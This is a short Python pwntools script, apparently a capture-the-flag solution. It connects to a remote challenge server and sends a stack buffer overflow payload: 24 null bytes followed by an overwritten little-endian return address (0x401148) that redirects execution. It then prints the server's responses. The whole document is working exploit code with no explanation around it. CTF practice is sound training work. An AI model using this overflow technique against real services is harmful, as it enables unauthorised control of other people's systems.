#!/usr/bin/env python3

from pwn import *

con = remote('wis-challs.studsec.nl', 8470)

ret_addr = 0x401148.to_bytes(8, "little")

inp = (b'\x00' * 24) + ret_addr

print(inp)

t = int(time.time())

print(con.recvline())
con.sendline(inp)

while True:
    print(con.recvline())


